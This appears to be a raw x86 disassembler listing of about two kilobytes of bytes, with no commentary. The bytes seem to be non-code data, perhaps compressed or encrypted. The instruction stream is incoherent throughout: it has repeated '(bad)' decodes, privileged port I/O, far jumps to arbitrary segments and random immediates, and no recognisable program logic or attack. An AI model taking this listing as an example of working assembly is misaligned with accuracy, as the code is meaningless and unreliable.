  41d77f:	cmp    DWORD PTR [eax+0x2c],0x673723aa
  41d786:	in     eax,0xcd
  41d788:	cmp    eax,0xd54d930
  41d78d:	add    ch,BYTE PTR [eax]
  41d78f:	es icebp 
  41d791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d792:	pop    es
  41d793:	mov    cl,0x93
  41d795:	fisttp QWORD PTR [edx]
  41d797:	dec    esi
  41d798:	push   es
  41d799:	js     0x41d7ad
  41d79b:	cld    
  41d79c:	(bad)  
  41d79d:	std    
  41d79e:	sahf   
  41d79f:	mov    ds:0xc06f1543,eax
  41d7a4:	fucomi st,st(2)
  41d7a6:	sar    ch,cl
  41d7a8:	(bad)  
  41d7a9:	mov    ch,0x45
  41d7ab:	pop    edi
  41d7ac:	ret    0xc188
  41d7af:	repz pop es
  41d7b1:	imul   edx,ecx,0x34
  41d7b4:	push   ss
  41d7b5:	sub    al,0x41
  41d7b7:	or     BYTE PTR [ebp+eax*1-0x7887e073],ch
  41d7be:	pop    ebx
  41d7bf:	dec    edx
  41d7c0:	sub    al,0x3a
  41d7c2:	xchg   edx,eax
  41d7c3:	jecxz  0x41d7db
  41d7c5:	(bad)  
  41d7c6:	jge    0x41d7f1
  41d7c8:	ds stc 
  41d7ca:	ja     0x41d767
  41d7cc:	dec    esi
  41d7cd:	xor    edi,edi
  41d7cf:	ja     0x41d844
  41d7d1:	xchg   esi,eax
  41d7d2:	gs and eax,0x77988907
  41d7d8:	mov    edx,0x2994d87d
  41d7dd:	sbb    ch,bh
  41d7df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7e0:	lock loop 0x41d7c7
  41d7e3:	dec    esi
  41d7e4:	push   ebx
  41d7e5:	xor    al,0xbf
  41d7e7:	dec    esp
  41d7e8:	mov    BYTE PTR [eax-0x1f],0x89
  41d7ec:	fisubr DWORD PTR ds:0x102399d6
  41d7f2:	push   eax
  41d7f3:	inc    esp
  41d7f4:	stc    
  41d7f5:	mov    eax,ds:0xe5edcc84
  41d7fa:	xchg   esp,eax
  41d7fb:	and    eax,0xa64dd87
  41d800:	dec    eax
  41d801:	ror    BYTE PTR [edx-0x60],0x3f
  41d805:	pop    eax
  41d806:	add    DWORD PTR ds:0xc447630,ecx
  41d80c:	mov    bh,BYTE PTR [ebx-0x8]
  41d80f:	scas   eax,DWORD PTR es:[edi]
  41d810:	jmp    0x13e3c331
  41d815:	out    0x7e,eax
  41d817:	mov    ecx,0x798ed445
  41d81c:	mov    esp,0x5f4a1a07
  41d821:	sbb    eax,0x9d15a776
  41d826:	sbb    ah,dl
  41d828:	pop    edi
  41d829:	in     eax,dx
  41d82a:	sti    
  41d82b:	xchg   edx,eax
  41d82c:	mov    ebp,0xbc0db728
  41d831:	pusha  
  41d832:	xor    DWORD PTR [eax+0x2286edee],0xffffff9e
  41d839:	xchg   DWORD PTR ds:0xd4d2f90,ebp
  41d83f:	clc    
  41d840:	mov    al,ds:0x760dbb37
  41d845:	pusha  
  41d846:	stos   DWORD PTR es:[edi],eax
  41d847:	cwde   
  41d848:	loope  0x41d825
  41d84a:	add    BYTE PTR [edx-0x38338510],0xcd
  41d851:	dec    eax
  41d852:	leave  
  41d853:	mov    bh,0xf4
  41d855:	fwait
  41d856:	popf   
  41d857:	jmp    0x5a90:0x56a57fde
  41d85e:	gs push esi
  41d860:	stos   DWORD PTR es:[edi],eax
  41d861:	mov    bl,dl
  41d863:	mov    edi,0xd19d9d0b
  41d868:	cld    
  41d869:	aam    0x68
  41d86b:	xchg   edx,eax
  41d86c:	sub    al,BYTE PTR [eax]
  41d86e:	cld    
  41d86f:	dec    esp
  41d870:	popa   
  41d871:	fiadd  DWORD PTR [edi-0x80]
  41d874:	mov    esp,0x1afeecb7
  41d879:	jbe    0x41d84b
  41d87b:	aad    0x8b
  41d87d:	xor    bl,BYTE PTR [si-0x48a8]
  41d882:	pushf  
  41d883:	mov    BYTE PTR [ecx-0x76353618],bh
  41d889:	push   ecx
  41d88a:	out    0x1f,eax
  41d88c:	sbb    DWORD PTR [ebp+0x3b],ebx
  41d88f:	retf   0x46ea
  41d892:	and    BYTE PTR [edx],cl
  41d894:	test   al,0x1
  41d896:	or     ecx,0x34
  41d899:	arpl   WORD PTR [esi+0x22e0bac4],ax
  41d89f:	jne    0x41d849
  41d8a1:	gs nop
  41d8a3:	fwait
  41d8a4:	xchg   esi,eax
  41d8a5:	lods   al,BYTE PTR ds:[esi]
  41d8a6:	jge    0x41d850
  41d8a8:	shr    DWORD PTR [edx-0x5a],0xd3
  41d8ac:	pop    edx
  41d8ad:	dec    edi
  41d8ae:	lds    ebx,FWORD PTR [edx-0x1a]
  41d8b1:	xor    DWORD PTR [edx],ebx
  41d8b3:	jg     0x41d8f3
  41d8b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8b6:	adc    eax,0xbbd02f63
  41d8bb:	pusha  
  41d8bc:	ret    
  41d8bd:	aad    0xae
  41d8bf:	es ret 0x1e13
  41d8c3:	jl     0x41d882
  41d8c5:	or     esi,esi
  41d8c7:	add    bh,al
  41d8c9:	xor    ebx,DWORD PTR [esi+0xb]
  41d8cc:	sub    bl,BYTE PTR [ecx]
  41d8ce:	inc    edx
  41d8cf:	mov    ecx,0x8f1d5eab
  41d8d4:	and    ah,dl
  41d8d6:	jge    0x41d870
  41d8d8:	jmp    0x41d87a
  41d8da:	daa    
  41d8db:	ds enter 0xa9a8,0xcb
  41d8e0:	adc    eax,0xd7facbdd
  41d8e5:	xchg   DWORD PTR [ebx],esp
  41d8e7:	mov    eax,DWORD PTR [eax+edi*2-0x2d]
  41d8eb:	push   esp
  41d8ec:	xchg   esi,eax
  41d8ed:	outs   dx,BYTE PTR ds:[esi]
  41d8ee:	sub    al,0x6
  41d8f0:	adc    al,BYTE PTR [esi]
  41d8f2:	sahf   
  41d8f3:	dec    ebp
  41d8f4:	cmp    eax,ebp
  41d8f6:	pop    ecx
  41d8f7:	mov    WORD PTR [edx],?
  41d8f9:	frstor [edi+eax*2-0x2f211a09]
  41d900:	sbb    DWORD PTR [ebx+0x2bc82e49],esp
  41d906:	pop    es
  41d907:	or     esi,DWORD PTR [eax-0x29]
  41d90a:	xor    al,0x34
  41d90c:	clc    
  41d90d:	xor    al,BYTE PTR [edi-0x576b907]
  41d913:	int    0x21
  41d915:	or     al,al
  41d917:	idiv   BYTE PTR [esp+eiz*8+0x67]
  41d91b:	cwde   
  41d91c:	dec    ebp
  41d91d:	ret    0xb074
  41d920:	xor    BYTE PTR [ebp-0x4f4f06e7],ch
  41d926:	sub    ch,bl
  41d928:	pusha  
  41d929:	popf   
  41d92a:	and    DWORD PTR [eax+ebx*2],esi
  41d92d:	cmp    BYTE PTR [ebx+0x7b11360a],al
  41d933:	arpl   WORD PTR [ebx+esi*2+0x63],sp
  41d937:	call   0x9eb6caa4
  41d93c:	mov    bh,0x19
  41d93e:	xor    edi,DWORD PTR [edi-0x5f116732]
  41d944:	inc    esp
  41d945:	pop    edi
  41d946:	jmp    0x8c62868a
  41d94b:	pop    esi
  41d94c:	(bad)  
  41d94d:	fisttp WORD PTR ds:0xf5b2e36f
  41d953:	bound  esp,QWORD PTR [ebx+0x3b]
  41d956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d957:	or     ecx,edi
  41d959:	xor    esi,DWORD PTR ds:0xc29c540d
  41d95f:	cs test eax,0x7e165b43
  41d965:	push   eax
  41d966:	jl     0x41d940
  41d968:	(bad)  
  41d969:	push   edx
  41d96a:	loopne 0x41d989
  41d96c:	sbb    al,0xd2
  41d96e:	jmp    0x53f80ee7
  41d973:	test   eax,0x509ec7f8
  41d978:	inc    edx
  41d979:	arpl   WORD PTR cs:[eax+0x74],si
  41d97d:	jns    0x41d991
  41d97f:	jb     0x41d90d
  41d981:	pop    esp
  41d982:	in     eax,dx
  41d983:	or     al,0xe5
  41d985:	(bad)  
  41d986:	and    eax,0x21f9d85a
  41d98b:	pop    edi
  41d98c:	or     ebp,ecx
  41d98e:	aaa    
  41d98f:	push   edx
  41d990:	test   BYTE PTR fs:[ecx],0xb0
  41d994:	push   edi
  41d995:	adc    eax,0x69406c18
  41d99a:	or     DWORD PTR [esi+0x51395a08],eax
  41d9a0:	mov    ah,0x8c
  41d9a2:	(bad)  
  41d9a3:	mov    DWORD PTR ds:0x894caa67,esp
  41d9a9:	test   DWORD PTR [eax-0x5a65c9b8],esi
  41d9af:	in     al,0x84
  41d9b1:	nop
  41d9b2:	in     al,dx
  41d9b3:	add    eax,0x28122137
  41d9b8:	pop    es
  41d9b9:	and    DWORD PTR [ebx],0xffffff92
  41d9bc:	(bad)  
  41d9bd:	imul   eax,DWORD PTR [ecx+edi*4],0x47
  41d9c1:	(bad)  
  41d9c2:	cmp    ch,BYTE PTR [ecx-0x15]
  41d9c5:	and    DWORD PTR [edi-0x7e],edi
  41d9c8:	fisub  WORD PTR [ecx+0x23206aec]
  41d9ce:	xor    BYTE PTR [eax],0x4f
  41d9d1:	and    al,0xb4
  41d9d3:	out    dx,al
  41d9d4:	push   0xae077534
  41d9d9:	add    DWORD PTR [edi+0x4],esi
  41d9dc:	or     al,0xee
  41d9de:	push   eax
  41d9df:	cwde   
  41d9e0:	sar    BYTE PTR [edi+0x2667168f],1
  41d9e6:	pop    ebx
  41d9e7:	sub    eax,0x3c1170fc
  41d9ec:	ret    0x54b6
  41d9ef:	cdq    
  41d9f0:	imul   edi,DWORD PTR [ebx],0x8354311a
  41d9f6:	push   ds
  41d9f7:	imul   esi,DWORD PTR [edi-0x74],0x49
  41d9fb:	out    0x43,eax
  41d9fd:	test   eax,0x8e0bbe1c
  41da02:	rcl    dl,1
  41da04:	adc    DWORD PTR [eax],ecx
  41da06:	xchg   ebx,eax
  41da07:	fcomp  DWORD PTR [ebp+0x1a]
  41da0a:	sub    eax,0x4d092a02
  41da0f:	mov    al,0x2d
  41da11:	jmp    0x41da48
  41da13:	mov    bl,0x27
  41da15:	xchg   dh,ch
  41da17:	jmp    0x16510ea2
  41da1c:	daa    
  41da1d:	sbb    edx,DWORD PTR [edi-0x56]
  41da20:	inc    edx
  41da21:	ins    DWORD PTR es:[edi],dx
  41da22:	addr16 xor al,0x6
  41da25:	sbb    cl,ah
  41da27:	loopne 0x41da09
  41da29:	ss pop edi
  41da2b:	enter  0x10a2,0x5c
  41da2f:	mov    ds:0xa3ed202b,al
  41da34:	iret   
  41da35:	xabort 0x4d
  41da38:	nop
  41da39:	mov    bh,0xa9
  41da3b:	stos   DWORD PTR es:[edi],eax
  41da3c:	mov    edx,0xdb757868
  41da41:	repnz cdq 
  41da43:	xchg   edi,eax
  41da44:	ror    cl,cl
  41da46:	xor    DWORD PTR [ecx],esi
  41da48:	icebp  
  41da49:	mov    WORD PTR [edi-0x77],cs
  41da4c:	push   edi
  41da4d:	sti    
  41da4e:	jnp    0x41da3c
  41da50:	and    BYTE PTR [ebx],dh
  41da52:	scas   al,BYTE PTR es:[edi]
  41da53:	jge    0x41da7a
  41da55:	not    BYTE PTR [ecx+ebx*1-0x4cc0704d]
  41da5c:	stc    
  41da5d:	and    al,0xed
  41da5f:	mov    WORD PTR [esi+0xa09baad],ds
  41da65:	xor    al,ah
  41da67:	and    edi,DWORD PTR [esi]
  41da69:	jmp    DWORD PTR [ecx-0x376dc3f2]
  41da6f:	rcr    DWORD PTR [edi],cl
  41da71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da72:	test   eax,0xf531013b
  41da77:	mov    BYTE PTR [ecx+0x61decbb5],dh
  41da7d:	lock imul esi,DWORD PTR [esp+ebx*2-0x1e],0x68fac6a0
  41da86:	hlt    
  41da87:	mov    cl,0x5e
  41da89:	div    BYTE PTR [esi*2+0x3ff71ab]
  41da90:	repz cmp DWORD PTR [eax+eiz*2-0x7a],ebp
  41da95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da96:	sbb    al,0x88
  41da98:	cli    
  41da99:	gs cld 
  41da9b:	inc    eax
  41da9c:	mov    ecx,0xe808da1a
  41daa1:	sbb    BYTE PTR [edx+eiz*2],0xa3
  41daa5:	imul   ecx,DWORD PTR [eax],0x1aaacc26
  41daab:	jno    0x41da6e
  41daad:	addr16 repz or ah,0xda
  41dab2:	adc    DWORD PTR [ecx-0x4ae3c8d9],edx
  41dab8:	out    0xb5,al
  41daba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dabc:	out    0xed,eax
  41dabe:	scas   eax,DWORD PTR es:[edi]
  41dabf:	and    DWORD PTR [edi-0x33],eax
  41dac2:	push   ebx
  41dac3:	mov    bh,al
  41dac5:	mov    ch,0xe5
  41dac7:	and    DWORD PTR [edi-0x51d20b3e],0xffffffb2
  41dace:	ffreep st(7)
  41dad0:	in     eax,0xe5
  41dad2:	cmp    edi,DWORD PTR [ebx]
  41dad4:	js     0x41db0d
  41dad6:	xor    al,0xc6
  41dad8:	fcom   QWORD PTR [ebp+0x28]
  41dadb:	sti    
  41dadc:	test   DWORD PTR [edx-0x47],edi
  41dadf:	inc    esp
  41dae0:	out    dx,al
  41dae1:	call   0x91a0:0xee04451c
  41dae8:	(bad)
  41daeb:	adc    eax,0x7b1b7c95
  41daf0:	jmp    0x5115:0x55b2d5f9
  41daf7:	ret    0xdbba
  41dafa:	leave  
  41dafb:	jo     0x41dab4
  41dafd:	enter  0x70d7,0xf2
  41db01:	xchg   ebp,eax
  41db02:	mov    eax,ds:0xb763eb28
  41db07:	sub    bl,BYTE PTR [eax-0x1b]
  41db0a:	add    eax,0x2e672bac
  41db0f:	ins    BYTE PTR es:[edi],dx
  41db10:	out    dx,al
  41db11:	and    al,0xe8
  41db13:	mov    dl,0x17
  41db15:	mov    ah,0x55
  41db17:	das    
  41db18:	imul   eax,DWORD PTR [edx+0x24],0xffffffc8
  41db1c:	inc    edx
  41db1d:	sub    eax,DWORD PTR [eax]
  41db1f:	lock sar BYTE PTR [eax],1
  41db22:	mov    ds:0xcab1ba67,eax
  41db27:	cld    
  41db28:	jmp    0xae810c09
  41db2d:	std    
  41db2e:	sbb    DWORD PTR [edi-0x12],0x28
  41db32:	cwde   
  41db33:	or     BYTE PTR [ebp+edi*8-0x43],al
  41db37:	adc    ebx,DWORD PTR [eax-0xd]
  41db3a:	and    DWORD PTR [edi],0xffffffff
  41db3d:	lahf   
  41db3e:	test   eax,0x16747a32
  41db43:	pop    ds
  41db44:	jge    0x41dbb5
  41db46:	enter  0x24e9,0xfa
  41db4a:	loop   0x41db80
  41db4c:	sbb    dl,BYTE PTR [esi]
  41db4e:	lods   al,BYTE PTR ds:[esi]
  41db4f:	int3   
  41db50:	out    dx,al
  41db51:	(bad)  
  41db52:	fst    DWORD PTR ds:0x131b1dc1
  41db58:	jge    0x41dbd9
  41db5a:	mov    BYTE PTR [esi-0x19],cl
  41db5d:	jns    0x41db3c
  41db5f:	xchg   edi,eax
  41db60:	sub    al,0x3e
  41db62:	fs test ecx,ebp
  41db65:	and    DWORD PTR [esi+0x63],edx
  41db68:	stos   DWORD PTR es:[edi],eax
  41db69:	jae    0x41db23
  41db6b:	mov    ecx,0xa97321dd
  41db70:	push   ecx
  41db71:	test   al,0xec
  41db73:	add    al,0x63
  41db75:	ret    0xf215
  41db78:	xchg   ecx,eax
  41db79:	gs fnstenv gs:[ebp+0x3caa59c2]
  41db81:	mov    edx,0x926d71a5
  41db86:	div    BYTE PTR [ecx-0x35]
  41db89:	(bad)  
  41db8a:	fld    QWORD PTR [edi]
  41db8c:	push   ebp
  41db8d:	sub    eax,DWORD PTR ds:0x43334287
  41db93:	hlt    
  41db94:	pop    ss
  41db95:	aam    0xb
  41db97:	mov    eax,0x63049d69
  41db9c:	retf   
  41db9d:	push   esi
  41db9e:	fstp   QWORD PTR [esi+esi*2-0x3401f030]
  41dba5:	or     DWORD PTR [edi],0xf1183f1
  41dbab:	aam    0xea
  41dbad:	test   eax,0x7c7a12f9
  41dbb2:	ja     0x41dbe5
  41dbb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbb5:	adc    al,0x27
  41dbb7:	daa    
  41dbb8:	jge    0x41db63
  41dbba:	outs   dx,DWORD PTR ds:[esi]
  41dbbb:	imul   eax,DWORD PTR ss:[ebx],0xffffffbd
  41dbbf:	add    al,0x92
  41dbc1:	les    edi,FWORD PTR [ebx]
  41dbc3:	cld    
  41dbc4:	adc    ch,ch
  41dbc6:	in     al,dx
  41dbc7:	int    0x68
  41dbc9:	iret   
  41dbca:	sbb    al,BYTE PTR [ecx-0x2f]
  41dbcd:	test   ebx,ecx
  41dbcf:	xchg   ebx,eax
  41dbd0:	shr    DWORD PTR [esi+0x6678a860],1
  41dbd6:	shr    WORD PTR [esi],1
  41dbd9:	(bad)  
  41dbda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbdb:	jae    0x41dc35
  41dbdd:	loope  0x41db84
  41dbdf:	add    ebx,DWORD PTR [edi]
  41dbe1:	(bad)  
  41dbe2:	pop    edi
  41dbe3:	ficomp WORD PTR [eax-0x3047c840]
  41dbe9:	cwde   
  41dbea:	call   0xede74c27
  41dbef:	test   DWORD PTR [ecx],esp
  41dbf1:	mov    bh,0xc8
  41dbf3:	imul   ecx,eax,0x4306d9e4
  41dbf9:	test   DWORD PTR [edi+0x33],eax
  41dbfc:	add    ebp,0x4a51952b
  41dc02:	or     DWORD PTR [ebx+0x4ddbf373],esi
  41dc08:	es aas 
  41dc0a:	dec    ebx
  41dc0b:	cmp    DWORD PTR [eax-0x11],ebp
  41dc0e:	idiv   edi
  41dc10:	sar    DWORD PTR [edi-0x45d2e7ef],cl
  41dc16:	fsub   DWORD PTR [esi]
  41dc18:	data16 jno 0x41dc32
  41dc1b:	cmp    eax,0x116f8fe5
  41dc20:	retf   0x214a
  41dc23:	push   esi
  41dc24:	out    dx,eax
  41dc25:	or     cx,WORD PTR [ebx+0x48c33022]
  41dc2c:	push   ecx
  41dc2d:	add    ch,BYTE PTR [edi]
  41dc2f:	mov    cl,0x1f
  41dc31:	mov    ch,BYTE PTR [edx-0x5769a653]
  41dc37:	cmp    esp,eax
  41dc39:	ja     0x41dc88
  41dc3b:	(bad)
  41dc3f:	es cmc 
  41dc41:	test   ah,ah
  41dc43:	test   al,0xef
  41dc45:	jne    0x41dc8c
  41dc47:	mov    dh,0x21
  41dc49:	mov    dl,dh
  41dc4b:	ins    DWORD PTR es:[edi],dx
  41dc4c:	lods   eax,DWORD PTR ds:[esi]
  41dc4d:	lock fild DWORD PTR [edi-0x15]
  41dc51:	and    BYTE PTR [edx-0x2f969f00],dh
  41dc57:	(bad)  
  41dc58:	(bad)  
  41dc59:	push   esp
  41dc5a:	and    DWORD PTR [edi],0xffffffe7
  41dc5d:	loopne 0x41dc71
  41dc5f:	push   ebx
  41dc60:	jmp    0xb964:0xec363411
  41dc67:	xor    eax,0xf244d496
  41dc6c:	dec    edi
  41dc6d:	dec    esp
  41dc6e:	daa    
  41dc6f:	dec    edi
  41dc70:	xchg   ebp,eax
  41dc71:	lahf   
  41dc72:	or     cl,BYTE PTR [edx]
  41dc74:	mov    edx,0x9cdd3458
  41dc79:	sub    BYTE PTR [edi+0x17],0x5c
  41dc7d:	xor    ecx,edx
  41dc7f:	iret   
  41dc80:	push   eax
  41dc81:	or     DWORD PTR [edx-0x7a],eax
  41dc84:	adc    al,0xe5
  41dc86:	test   DWORD PTR [edx+0x61],esi
  41dc89:	dec    edx
  41dc8a:	arpl   WORD PTR [edi-0x34c03b52],di
  41dc90:	sub    BYTE PTR [ebx-0x4ad124dd],ah
  41dc96:	push   ebx
  41dc97:	adc    BYTE PTR [edi+eax*4],al
  41dc9a:	xchg   ebp,eax
  41dc9b:	das    
  41dc9c:	mov    ah,0x3e
  41dc9e:	std    
  41dc9f:	in     al,dx
  41dca0:	lea    ecx,ss:[edx]
  41dca3:	push   edi
  41dca4:	mov    edi,0x308534ad
  41dca9:	adc    bh,bh
  41dcab:	ins    DWORD PTR es:[edi],dx
  41dcac:	fidivr WORD PTR [eax]
  41dcae:	cmc    
  41dcaf:	sar    BYTE PTR [eax+0x30],1
  41dcb2:	gs push esi
  41dcb4:	lea    esi,ds:[esi]
  41dcb7:	pop    esi
  41dcb8:	and    esi,DWORD PTR [edi]
  41dcba:	cmp    al,0xa5
  41dcbc:	emms   
  41dcbe:	mov    bh,0x42
  41dcc0:	jne    0x41dc9c
  41dcc2:	pop    es
  41dcc3:	gs or  al,0x78
  41dcc6:	fsub   st(7),st
  41dcc8:	loop   0x41dc60
  41dcca:	inc    esi
  41dccb:	add    cl,BYTE PTR [eax-0x318bd5c1]
  41dcd1:	test   eax,0x5428ad1f
  41dcd6:	push   0xffffff9f
  41dcd8:	add    eax,0xd3476e0b
  41dcdd:	and    BYTE PTR [eax+0x56],0x77
  41dce1:	in     al,0x55
  41dce3:	sbb    eax,0xc471c4db
  41dce8:	hlt    
  41dce9:	xor    eax,0x1e5dcef0
  41dcee:	call   0x5022:0xc5ed7e15
  41dcf5:	and    BYTE PTR [esi-0xb],0x50
  41dcf9:	xor    BYTE PTR [eax+ecx*1-0x78cbf70b],ah
  41dd00:	pop    eax
  41dd01:	cs and al,0x1b
  41dd04:	(bad)  
  41dd05:	mov    edi,0x3dadcd20
  41dd0a:	ror    cl,1
  41dd0c:	ins    DWORD PTR es:[edi],dx
  41dd0d:	add    DWORD PTR [esp+edi*8+0x2ed57a60],0x19
  41dd15:	push   es
  41dd16:	out    0x3,eax
  41dd18:	and    BYTE PTR [ecx+0x47],0x90
  41dd1c:	mov    ecx,0x85483bfa
  41dd21:	mov    BYTE PTR [eax-0x21eb3eb],ch
  41dd27:	call   0x36a9:0x1d2f85af
  41dd2e:	jns    0x41dcec
  41dd30:	cmp    DWORD PTR [edi+0x7a677b84],edi
  41dd36:	ins    BYTE PTR es:[edi],dx
  41dd37:	xor    al,0x29
  41dd39:	fld    DWORD PTR [ecx+edx*4+0x28b9aed5]
  41dd40:	lds    edi,FWORD PTR [esi-0x68f26f7]
  41dd46:	ficomp WORD PTR [eax+0x12d43e42]
  41dd4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd4d:	fsubr  DWORD PTR [ecx+edi*4]
  41dd50:	jno    0x41dcfb
  41dd52:	add    al,BYTE PTR [edx+esi*4+0x5e]
  41dd56:	scas   eax,DWORD PTR es:[edi]
  41dd57:	or     al,0x72
  41dd59:	adc    DWORD PTR [ecx],ebp
  41dd5b:	rcl    BYTE PTR [eax+0x66],cl
  41dd5e:	(bad)  
  41dd5f:	and    ebx,0x8638ae94
  41dd65:	in     al,0x12
  41dd67:	or     BYTE PTR [ecx+0x51],0xea
  41dd6b:	xor    al,0x7d
  41dd6d:	sbb    eax,0x569024ee
  41dd72:	sahf   
  41dd73:	fisttp DWORD PTR [esi+edx*8+0x34]
  41dd77:	idiv   DWORD PTR [eax+0x4b634f8b]
  41dd7d:	and    BYTE PTR [esi],0x67
  41dd80:	cmp    eax,0x8e87f2fa
  41dd85:	mov    ebp,esp
  41dd87:	repnz les esi,FWORD PTR [ebx+edx*4-0x57]
  41dd8c:	sbb    ecx,0x31
  41dd8f:	jmp    0xe534:0x3ea1c55c
  41dd96:	mov    ?,esp
  41dd98:	push   ss
  41dd99:	mov    gs,ecx
  41dd9b:	div    BYTE PTR [ecx-0x1f]
  41dd9e:	repz xchg ebx,eax
  41dda0:	mov    WORD PTR [ecx],cs
  41dda2:	or     DWORD PTR [edi-0x71d433da],0x41
  41dda9:	cmovg  eax,edx
  41ddac:	mov    ebx,0x7d7f0ee0
  41ddb1:	pop    eax
  41ddb2:	sbb    DWORD PTR [ebp+0x49276e56],0xffffff98
  41ddb9:	in     eax,0x43
  41ddbb:	sbb    cl,bl
  41ddbd:	aaa    
  41ddbe:	push   ecx
  41ddbf:	jae    0x41dda4
  41ddc1:	jmp    FWORD PTR [ecx]
  41ddc3:	sahf   
  41ddc4:	add    dl,BYTE PTR [edx-0x56acab4f]
  41ddca:	add    DWORD PTR [edi+0x69],edi
  41ddcd:	sbb    DWORD PTR [eax-0x3],ecx
  41ddd0:	mov    DWORD PTR [edx-0x46],esi
  41ddd3:	test   al,0x2f
  41ddd5:	arpl   bp,cx
  41ddd7:	jecxz  0x41dd5c
  41ddd9:	jb     0x41de2d
  41dddb:	fs cmp edx,esi
  41ddde:	ja     0x41de33
  41dde0:	mov    ebp,0x5a45b2de
  41dde5:	lock push es
  41dde7:	pusha  
  41dde8:	or     edi,DWORD PTR [eax]
  41ddea:	jno    0x41ddc7
  41ddec:	push   esi
  41dded:	mov    ds:0xc30ddde4,eax
  41ddf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddf3:	adc    al,0x30
  41ddf5:	add    al,0x97
  41ddf7:	adc    bl,BYTE PTR [ecx+0x415c05be]
  41ddfd:	stos   DWORD PTR es:[edi],eax
  41ddfe:	sbb    eax,0xbc360ee2
  41de03:	int    0xfe
  41de05:	mov    ecx,0x627e105b
  41de0a:	dec    esp
  41de0b:	mov    bl,0x67
  41de0d:	mov    ebp,0x693c7dc5
  41de12:	jge    0x41de61
  41de14:	pop    eax
  41de15:	pop    edi
  41de16:	ret    
  41de17:	sub    edx,DWORD PTR [ecx+0x61]
  41de1a:	sahf   
  41de1b:	mov    edx,0xf49a56e0
  41de20:	aas    
  41de21:	fist   DWORD PTR [ecx+0x39731b56]
  41de27:	aas    
  41de28:	sub    eax,0x3533d13b
  41de2d:	push   cs
  41de2e:	into   
  41de2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de30:	cmc    
  41de31:	adc    ah,bh
  41de33:	add    al,0xe8
  41de35:	(bad)  
  41de36:	and    eax,0x2fc17894
  41de3b:	mov    al,ds:0x986554e0
  41de40:	jns    0x41debb
  41de42:	cli    
  41de43:	jae    0x41dea9
  41de45:	das    
  41de46:	aas    
  41de47:	and    DWORD PTR [edx+0x68],0xfe40dbd4
  41de4e:	stc    
  41de4f:	inc    edi
  41de50:	in     eax,0x3e
  41de52:	cmp    al,0x8d
  41de54:	into   
  41de55:	lea    edi,[ebx-0x6ca428dd]
  41de5b:	xchg   DWORD PTR [esi+0x306f1e52],ecx
  41de61:	jns    0x41dec5
  41de63:	dec    edx
  41de64:	pusha  
  41de65:	(bad)  
  41de66:	nop
  41de67:	mov    ds:0xa11fc5e,eax
  41de6c:	lods   al,BYTE PTR ds:[esi]
  41de6d:	fdiv   QWORD PTR [esi]
  41de6f:	push   esi
  41de70:	arpl   WORD PTR ds:[ebp-0x1b0cc0a],di
  41de77:	inc    ecx
  41de78:	stos   BYTE PTR es:[edi],al
  41de79:	or     BYTE PTR [ecx-0x6d],dh
  41de7c:	(bad)  [ebp-0x560249d1]
  41de82:	clc    
  41de83:	stos   DWORD PTR es:[edi],eax
  41de84:	std    
  41de85:	xor    DWORD PTR [ecx],edx
  41de87:	(bad)  
  41de89:	sbb    ebx,esi
  41de8b:	adc    eax,eax
  41de8d:	or     esp,DWORD PTR [ebx+ecx*4+0x5e47da47]
  41de94:	inc    edi
  41de95:	jb     0x41de21
  41de97:	nop
  41de98:	adc    BYTE PTR [esi],ch
  41de9a:	pop    ebx
  41de9b:	cmp    eax,0xead5679f
  41dea0:	mov    ss,WORD PTR [edx+eax*1]
  41dea3:	fldenv [esi-0x7e]
  41dea6:	retf   
  41dea7:	and    esp,DWORD PTR [esi-0x20]
  41deaa:	adc    BYTE PTR [ebp-0x2b29ae6f],0xeb
  41deb1:	cdq    
  41deb2:	in     eax,dx
  41deb3:	adc    bh,BYTE PTR ds:0x6f0ab95a
  41deb9:	enter  0xdedd,0xd1
  41debd:	push   ds
  41debe:	sahf   
  41debf:	fild   DWORD PTR [esp+ecx*8]
  41dec2:	sti    
  41dec3:	xchg   esi,eax
  41dec4:	rcr    bl,0x6a
  41dec7:	test   eax,0x75424901
  41decc:	sbb    bh,dl
  41dece:	add    eax,0x70cd2b7e
  41ded3:	add    DWORD PTR [eax+eax*8-0x30bba5fb],esi
  41deda:	push   esi
  41dedb:	mov    ds:0x817a5d46,eax
  41dee0:	test   BYTE PTR [edx+0x23affce3],al
  41dee6:	xor    BYTE PTR [ebp+eax*8+0x35],dl
  41deea:	push   DWORD PTR [edx+0x5341bad6]
  41def0:	xchg   ebp,eax
  41def1:	mov    ebx,0x75e788a8
  41def6:	xchg   ebp,eax
  41def7:	fidiv  WORD PTR [ebp+0x4c0bc142]
  41defd:	das    
  41defe:	mov    al,0x48
  41df00:	in     al,0x63
  41df02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df03:	or     eax,0x7626ac17
  41df08:	(bad)  
  41df09:	div    BYTE PTR [eax]
  41df0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df0c:	cli    
  41df0d:	out    dx,eax
  41df0e:	adc    dl,BYTE PTR [esi-0x1b6d0b3e]
  41df14:	scas   al,BYTE PTR es:[edi]
  41df15:	scas   al,BYTE PTR es:[edi]
  41df16:	jle    0x41debb
  41df18:	push   es
  41df19:	jae    0x41df6f
  41df1b:	ficomp WORD PTR [edx+0x2f7e7d5e]
  41df21:	lock imul esi,esi,0x22
  41df25:	and    BYTE PTR [esi],dl
  41df27:	pop    edx
  41df28:	pop    ds
  41df29:	dec    eax
  41df2a:	das    
  41df2b:	outs   dx,BYTE PTR ds:[esi]
  41df2c:	xchg   DWORD PTR [edx+0x1a],eax
  41df2f:	daa    
  41df30:	enter  0xb062,0xb9
  41df34:	cdq    
  41df35:	lock mov al,0x7b
  41df38:	mov    BYTE PTR [edx-0x50],dh
  41df3b:	jnp    0x41df40
